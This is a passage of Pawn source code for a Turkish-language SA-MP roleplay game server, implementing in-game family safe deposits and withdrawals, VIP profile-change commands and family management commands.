		GivePlayerValidWeapon(playerid, FamilyInfo[family][FamilyGuns][slot-1], 60000);
		FamilyInfo[family][FamilyGuns][slot-1] = 0;
		if(strcmp(weaponname, "silenced pistol", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Aile kasasýndan Susturuculu tabanca çýkardýn.");
			format(string,sizeof(string), "* %s aile kasasýndan Susturuculu tabanca çýkardý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "desert eagle", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ailenin kasasýndan Desert Eagle çýkardýn.");
			format(string,sizeof(string), "* %s aile kasasýndan Desert Eagle çýkardýn.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "shotgun", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ailenin kasasýndan Shotgun çýkardýn.");
			format(string,sizeof(string), "* %s aile kasasýndan Shotgun çýkardý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "combat shotgun", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ailenin kasasýndan SPAS-12 çýkardýn.");
			format(string,sizeof(string), "* %s aile kasasýndan SPAS-12 çýkardý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "mp5", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ailenin kasasýndan MP5 çýkardýn.");
			format(string,sizeof(string), "* %s aile kasasýndan MP5 çýkardý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "ak47", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ailenin kasasýndan AK-47 çýkardýn.");
			format(string,sizeof(string), "* %s aile kasasýndan AK-47 çýkardý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "m4", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ailenin kasasýndan M4 çýkardýn.");
			format(string,sizeof(string), "* %s aile kasasýndan M4 çýkardý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "rifle", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ailenin kasasýndan Rifle çýkardýn.");
			format(string,sizeof(string), "* %s aile kasasýndan Rifle çýkardý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "sniper rifle", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ailenin kasasýndan Sniper Rifle çýkardýn.");
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			format(string,sizeof(string), "* %s aile kasasýndan sniper rifle çýkardý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		SaveFamilies();
		return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "Bu slotta sakladýðýn bir silah yok.");
		return 1;
	}
}

CMD:akasayakoy(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	new string[128], choice[32], amount;
	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /akasayakoy [name] [amount]");
		SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: Para, Materyal, Pot, Crack.");
		return 1;
	}

	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bir ailede deðilsin.");
		return 1;
	}
	if(FamilyInfo[family][FamilyUSafe] < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Your family has not upgraded their safe.");
		return 1;
	}
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, FamilyInfo[family][FamilySafe][0], FamilyInfo[family][FamilySafe][1], FamilyInfo[family][FamilySafe][2]))
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Aile kasasýna yakýn deðilsin.");
		return 1;
	}
	if(strcmp(choice,"Para",true) == 0)
	{
		if(amount > GetPlayerCash(playerid) || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "O kadar crackin yok.");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyCash] += amount;
		GivePlayerCash(playerid, -amount);
		format(string, sizeof(string), "Ailenin kasasýna baþarýlý bir þekilde $%d para koydun.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s cüzdanýndan biraz para çýkarýr ve ailesinin kasasýna koyar.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) $%d parayý %d. ailenin kasasýna koydu.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]);
		Log("logs/pay.log", string);
	}
	else if(strcmp(choice,"Materyal",true) == 0)
	{
		if(amount > PlayerInfo[playerid][pMats] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "O kadar crackin yok.");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyMats] += amount;
		PlayerInfo[playerid][pMats] -= amount;
		format(string, sizeof(string), "Ailenin kasasýna baþarýlý bir þekilde %d materyal koydun.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s cebinden biraz materyal çýkarýr ve ailesinin kasasýna koyar.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) %d materyali %d. ailenin kasasýna koydu.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]);
		Log("logs/pay.log", string);
	}
	else if(strcmp(choice,"pot",true) == 0)
	{
		if(amount > PlayerInfo[playerid][pPot] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "O kadar crackin yok.");
			return 1;
		}
		if(amount < 1 || amount > 50)
		{
			SendClientMessage(playerid, COLOR_GREY, "Ayný anda 50 gramdan fazla depolayamazsýn.");
			return 1;
		}
		if(amount + FamilyInfo[family][FamilyPot] >= 500)
		{
			SendClientMessage(playerid, COLOR_GREY, "Ailenin kasasý potla dolu!");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyPot] += amount;
		PlayerInfo[playerid][pPot] -= amount;
		format(string, sizeof(string), "Ailenin kasasýna baþarýlý bir þekilde %d gram pot koydun.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s cebinden biraz pot çýkarýr ve ailesinin kasasýna koyar.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) %d gram potu %d. ailenin kasasýna koydu.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]);
		Log("logs/pay.log", string);
	}
	else if(strcmp(choice,"crack",true) == 0)
	{
		if(amount > PlayerInfo[playerid][pCrack] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "O kadar crackin yok.");
			return 1;
		}
		if(amount < 1 || amount > 25)
		{
			SendClientMessage(playerid, COLOR_GREY, "Ayný anda 25 gramdan fazla saklayamazsýn.");
			return 1;
		}
		if(amount + FamilyInfo[family][FamilyCrack] >= 250)
		{
			SendClientMessage(playerid, COLOR_GREY, "Ailenin kasasý crackle dolu!");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyCrack] += amount;
		PlayerInfo[playerid][pCrack] -= amount;
		format(string, sizeof(string), "%d gram cracki baþarýlý bir þekilde alienin kasasýna koydun.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s cebinden biraz crack çýkarýr ve ailesinin kasasýna koyar.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) %d gram cracki %d. ailenin kasasýna koydu.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]);
		Log("logs/pay.log", string);
	}
	return 1;
}

CMD:yasdegistir(playerid, params[]) {
	if(PlayerInfo[playerid][pDonator] < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Bu komutu yalnýzca VIP olanlar kullanabilir.");

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /yasdegistir [16-122]");

	new
	    szMessage[34],
	    iAge = strval(params);

	if(iAge >= 16 && iAge <= 122) {
	    PlayerInfo[playerid][pAge] = iAge;

	    format(szMessage, sizeof(szMessage), "Yaþýný %d olarak deðiþtirdin.", iAge);
	    SendClientMessage(playerid, COLOR_WHITE, szMessage);
	} else SendClientMessage(playerid, COLOR_GREY, "Yaþ 16 ile 122 arasýnda olmalýdýr.");
	return 1;
}

CMD:numaradegistir(playerid, params[]) {
	if(PlayerInfo[playerid][pDonator] < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Bu komutu yalnýzca VIP olanlar kullanabilir.");

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /numaradegistir [yeni istedigin numara]");

	if(PlayerInfo[playerid][pNumber] == 0)
	    return SendClientMessage(playerid, COLOR_GREY, "Telefon numaraný deðiþtirmen için önce telefonun olmasý gerek.");

	if(AdminDuty[playerid] == 1)
		return SendClientMessage(playerid, COLOR_GREY, "Admin iþbaþýndayken telefon numaraný deðiþtiremezsin.");

	new
	    szMessage[66],
	    iPH = strval(params);

	if(iPH != 555 && iPH != 911 && iPH != 0 && iPH != 912) {
	    if(CheckVPH(iPH) == 0) {
	        if(GetPlayerCash(playerid) < 2500)
				return SendClientMessage(playerid, COLOR_GREY,"   Bunu ödeyemezsin!");

			format(szMessage, sizeof(szMessage), "Telefon numaraný $2500 ödeyerek %d olarak deðiþtirdin.", iPH);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);

			GivePlayerCash(playerid, -2500);

			ReplacePH(PlayerInfo[playerid][pNumber], iPH);

			PlayerInfo[playerid][pNumber] = iPH;
	    } else {
	        format(szMessage, sizeof(szMessage), "%d numarasý baþkasý tarafýndan alýnmýþ. Baþka numara deneyin.");
	        SendClientMessage(playerid, COLOR_WHITE, szMessage);
	    }
	} else SendClientMessage(playerid, COLOR_GREY, "Ýstediðin numara scriptten rezerve edilmiþ.");
	return 1;
}

CMD:cinsiyetdegistir(playerid, params[]) {
	if(PlayerInfo[playerid][pDonator] < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Bu komutu yalnýzca VIP olanlar kullanabilir.");

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /cinsiyetdegistir ['erkek' yada 'bayan']");

	if(!strcmp(params, "erkek", true)) {
	    PlayerInfo[playerid][pSex] = 1;
	    SendClientMessage(playerid, COLOR_WHITE, "Artýk erkeksin.");
	} else if(!strcmp(params, "bayan", true)) {
	    PlayerInfo[playerid][pSex] = 2;
	    SendClientMessage(playerid, COLOR_WHITE, "Artýk bayansýn.");
	} else SendClientMessage(playerid, COLOR_GREY, "Üzgünüm, onu burda yapmýyoruz.");

	return 1;
}

CMD:akasadanal(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	new string[128], choice[32], amount;
	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /akasadanal [isim] [miktar]");
		SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: Para, Materyal, Pot, Crack.");
		return 1;
	}

	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bir ailede deðilsin.");
		return 1;
	}
	if(FamilyInfo[family][FamilyUSafe] < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Ailen, aile kasasýný güncellememiþ.");
		return 1;
	}
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, FamilyInfo[family][FamilySafe][0], FamilyInfo[family][FamilySafe][1], FamilyInfo[family][FamilySafe][2]))
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Aile kasasýna yakýn deðilsin.");
		return 1;
	}
	if(PlayerInfo[playerid][pRank] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Sadece R5 ve R6'lar aile kasasýndan birþeyler alabilir.");
		return 1;
	}
	if(strcmp(choice,"para",true) == 0)
	{
		if(amount > FamilyInfo[family][FamilyCash] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Ailende bu kadar yok.");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyCash] -= amount;
		GivePlayerCash(playerid, amount);
		format(string, sizeof(string), "Ailenin kasasýndan baþarýlý bir þekilde $%d para aldýn.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s ailesinin kasasýndan biraz para aldý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) $%d parayý %d. ailesinin kasasýndan aldý.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]+1);
		Log("logs/family.log", string);
	}
	else if(strcmp(choice,"materyal",true) == 0)
	{
		if(amount > FamilyInfo[family][FamilyMats] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Ailende bu kadar yok.");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyMats] -= amount;
		PlayerInfo[playerid][pMats] += amount;
		format(string, sizeof(string), "Ailenin kasasýndan baþarýlý bir þekilde %d materyal aldýn.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s ailesinin kasasýndan biraz materyal aldý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) %d materyali %d. aile kasasýndan aldý.",GetPlayerNameEx(playerid), ip,amount,PlayerInfo[playerid][pGang]+1);
		Log("logs/family.log", string);
	}
	else if(strcmp(choice,"pot",true) == 0)
	{
		if(amount > FamilyInfo[family][FamilyPot] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Ailende bu kadar yok.");
			return 1;
		}
		if(PlayerInfo[playerid][pPot] > 50)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Zaten 50 gram potun var.");
			return 1;
		}
		new level = PlayerInfo[playerid][pDrugsSkill];
		if(level >= 0 && level < 50)
		{ if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 10'dan fazla taþýyamazsýn!"); return 1; } }
		else if(level >= 50 && level < 100)
		{ if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 20'den fazla taþýyamazsýn!"); return 1; } }
		else if(level >= 100 && level < 200)
		{ if(amount < 1 || amount > 30) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 30'dan fazla taþýyamazsýn!"); return 1; } }
		else if(level >= 200 && level < 400)
		{ if(amount < 1 || amount > 40) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 40'dan fazla taþýyamazsýn."); return 1; } }
		else if(level >= 400)
		{ if(amount < 1 || amount > 50) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 50'den fazla taþýyamazsýn."); return 1; } }
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyPot] -= amount;
		PlayerInfo[playerid][pPot] += amount;
		format(string, sizeof(string), "Ailenin kasasýndan baþarýlý bir þekilde %d gram pot aldýn.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s ailesinin kasasýndan biraz pot aldý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) %d gram potu %d. aile kasasýndan aldý.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]+1);
		Log("logs/family.log", string);
	}
	else if(strcmp(choice,"crack",true) == 0)
	{
		if(amount > FamilyInfo[family][FamilyCrack] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Ailende bu kadar yok.");
			return 1;
		}
		if(PlayerInfo[playerid][pCrack] > 25)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Zaten 25 gram cracke sahipsin.");
			return 1;
		}
		new level = PlayerInfo[playerid][pDrugsSkill];
		if(level >= 0 && level < 50)
		{ if(amount < 1 || amount > 5) { SendClientMessage(playerid, COLOR_GREY, "    Meslek levelin dolayýsýyla 5'den fazla taþýyamazsýn!"); return 1; } }
		else if(level >= 50 && level < 100)
		{ if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 10'dan fazla taþýyamazsýn!"); return 1; } }
		else if(level >= 100 && level < 200)
		{ if(amount < 1 || amount > 15) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 15'den fazla taþýyamazsýn!"); return 1; } }
		else if(level >= 200 && level < 400)
		{ if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 20'den fazla taþýyamazsýn!"); return 1; } }
		else if(level >= 400)
		{ if(amount < 1 || amount > 25) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 25'ten fazla taþýyamazsýn!"); return 1; } }
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyCrack] -= amount;
		PlayerInfo[playerid][pCrack] += amount;
		format(string, sizeof(string), "Ailenin kasasýndan baþarýlý bir þekilde %d gram crack aldýn.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s ailesinin kasasýndan biraz crack çýkardý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) %d gram cracki %d. aile kasasýndan aldý.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]+1);
		Log("logs/family.log", string);
	}
	return 1;
}

CMD:ayarla(playerid, params[])
{
	if(PlayerInfo[playerid][pGang] == 255)
		return SendClientMessage(playerid, COLOR_GREY, "Bir ailede deðilsin.");

	if(PlayerInfo[playerid][pRank] >= 5) {
		new
		choice[32],
		opstring[100],
		family = PlayerInfo[playerid][pGang],
		string[128];

		if(sscanf(params, "s[32]S()[100]", choice, opstring)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ayarla [name]");
			SendClientMessage(playerid, COLOR_WHITE, "Kullanýlabilir Isimler: Isim, Haber, Kasa, Davetet, Ailedenat");
			return 1;
		}

		if(strcmp(choice,"isim",true) == 0) {
			if(!opstring[0])
				return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ayarla name [family name]");

			if(strfind(opstring, "|", true) != -1)
				return SendClientMessage(playerid, COLOR_GRAD2,  "You can't use '|' in a family name.");

			if(strlen(opstring) >= 40)
				return SendClientMessage(playerid, COLOR_GRAD1, "That family name is too long, please refrain from using more than 40 characters.");

			for(new i = 0; i < MAX_POINTS; i++) {
				if(strcmp(Points[i][Owner], FamilyInfo[family][FamilyName], true) == 0) {
					strmid(Points[i][Owner], opstring, 0, strlen(opstring), 100);
				}
			}

			strmid(FamilyInfo[family][FamilyName], opstring, 0, strlen(opstring), 100);
			SaveFamilies();

			SendClientMessage(playerid, COLOR_WHITE, "Ailenin adýný ayarladýn.");
			format(string, sizeof(string), "%s, %d. ailenin adýný %s olarak deðiþtirdi.", GetPlayerNameEx(playerid), family+1, opstring);
			Log("logs/family.log", string);
			return 1;
		} else if(strcmp(choice,"haber",true) == 0) {
			if(!opstring[0])
				return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ayarla haber [aile haber yazýsý]");

			if(strfind(opstring, "|", true) != -1)
				return SendClientMessage(playerid, COLOR_GRAD2,  "Aile haberinde '|' kullanamazsýn.");

			if(strlen(opstring) >= 60)
				return SendClientMessage(playerid, COLOR_GRAD1, "Bu haber çok uzun, 60 karakterden fazla kullanamazsýn.");

			strmid(FamilyInfo[family][FamilyMOTD], opstring, 0, strlen(opstring), 100);
			SaveFamilies();
			SendClientMessage(playerid, COLOR_WHITE, "Aile haberini deðiþtirdin.");
			format(string, sizeof(string), "%s, %d. ailenin haberini %s olarak ayarladý", GetPlayerNameEx(playerid), family+1, opstring);
			Log("logs/family.log", string);
			return 1;
		} else if(strcmp(choice,"kasa",true) == 0) {
			SendClientMessage(playerid, COLOR_GRAD1, "Aile kasasýnýn yerini ayarlamak, tüm kasanýn içerisini boþaltýr.");
			SendClientMessage(playerid, COLOR_GRAD1, "Aile kasaný ayarlamak istiyorsan, /ayarla onay yaz.");
			SendClientMessage(playerid, COLOR_GRAD1, "Aile kasaný geliþtirmek sana $5,000'a patlayacak.");
			return 1;
		} else if(strcmp(choice,"onay",true) == 0) {
			if(GetPlayerCash(playerid) < 5000)
				return SendClientMessage(playerid, COLOR_GRAD1, "Aile kasaný geliþtirmek için $5,000'ýn yok.");

			GivePlayerCash(playerid, -5000);
			GetPlayerPos(playerid, FamilyInfo[family][FamilySafe][0],FamilyInfo[family][FamilySafe][1],FamilyInfo[family][FamilySafe][2]);
			FamilyInfo[family][FamilyCash] = 0;
			FamilyInfo[family][FamilyMats] = 0;
			FamilyInfo[family][FamilyPot] = 0;
			FamilyInfo[family][FamilyCrack] = 0;
			if(FamilyInfo[family][FamilyUSafe]) DestroyPickup(FamilyInfo[family][FamilyPickup]);
			FamilyInfo[family][FamilyUSafe] = 1;
			FamilyInfo[family][FamilyPickup] = CreatePickup(1239, 23, FamilyInfo[family][FamilySafe][0], FamilyInfo[family][FamilySafe][1], FamilyInfo[family][FamilySafe][2], -1);
			SaveFamilies();
			SendClientMessage(playerid, COLOR_WHITE, "Ailenin kasasýný ayarladýn.");
			format(string, sizeof(string), "%s, %d. ailenin kasasýný ayarladý", GetPlayerNameEx(playerid), family+1);
			Log("logs/family.log", string);
			return 1;
		} else if(strcmp(choice,"davetet",true) == 0) {
			if(!strlen(opstring))
				return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ayarla davetet [Oyuncu ID/Ýsim]");

			new
				giveplayerid = ReturnUser(opstring);
			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pGang] == 255) {
					if(PlayerInfo[giveplayerid][pLeader] == 2 || PlayerInfo[giveplayerid][pFaction] == 2 && PlayerInfo[giveplayerid][pDivision] == 2) {
						format(string, sizeof(string), "* %s adlý oyuncuyu '%s''a katýlmasý için davet ettin.",GetPlayerNameEx(giveplayerid), FamilyInfo[family][FamilyName]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s seni '%s' ailesine davet etti. (/kabulet aile)",GetPlayerNameEx(playerid), FamilyInfo[family][FamilyName]);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						InviteFaction[giveplayerid] = 0;
						InviteOffer[giveplayerid] = playerid;
						InviteFamily[giveplayerid] = family;

						format(string, sizeof(string), "%s, %s adlý kiþiyi %d. aileye davet etti.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), family+1);
						Log("logs/family.log", string);
						return 1;
					} else if(PlayerInfo[giveplayerid][pLeader] == 0 && PlayerInfo[giveplayerid][pFaction] == 0) {
						format(string, sizeof(string), "* %s adlý oyuncuyu '%s''a katýlmasý için davet ettin.",GetPlayerNameEx(giveplayerid), FamilyInfo[family][FamilyName]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s seni '%s' ailesine davet etti. (/kabulet aile)",GetPlayerNameEx(playerid), FamilyInfo[family][FamilyName]);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						InviteFaction[giveplayerid] = 0;
						InviteOffer[giveplayerid] = playerid;
						InviteFamily[giveplayerid] = family;
						format(string, sizeof(string), "%s, %s adlý kiþiyi %d. aileye davet etti.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), family+1);
						Log("logs/family.log", string);
						return 1;
					} else SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten bir aile yada oluþumda.");
				} else SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten bir aile yada oluþumda.");
			} else SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
		} else if(strcmp(choice,"ailedenat",true) == 0) {
			if(!strlen(opstring))
				return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ayarla ailedenat [Oyuncu ID/Ýsim]");

			new
				giveplayerid = ReturnUser(opstring);

			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pGang] != family)
					return SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu ailende deðil.");

				if(PlayerInfo[giveplayerid][pRank] > PlayerInfo[playerid][pRank])
					return SendClientMessage(playerid, COLOR_GREY, "Senden yüksek rütbedekileri aileden atamazsýn.");

				format(string, sizeof(string), "* %s adlý kiþiyi aileden attýn.",GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
